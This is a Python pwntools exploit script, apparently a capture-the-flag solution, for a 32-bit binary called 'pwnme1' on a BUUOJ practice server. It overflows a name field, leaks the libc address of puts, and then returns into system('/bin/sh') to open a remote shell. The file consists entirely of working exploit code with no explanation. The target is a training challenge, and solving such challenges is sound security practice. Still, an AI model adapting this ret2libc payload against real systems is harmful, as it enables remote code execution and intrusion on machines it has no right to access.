from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('pwnme1')
io = remote('node4.buuoj.cn', 27645)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('pwnme1')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

io.sendlineafter('>> 6. Exit    \n', '5')
payload = cyclic(0xa8) + p32(puts_plt) + p32(main) + p32(puts_got)
io.sendlineafter('Please input the name of fruit:', payload)
io.recvline()
libc_base = u32(io.recvn(4)) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
io.sendlineafter('>> 6. Exit    \n', '5')
payload = cyclic(0xa8) + p32(system) + p32(main) + p32(bin_sh)
io.sendlineafter('Please input the name of fruit:', payload)
io.interactive()
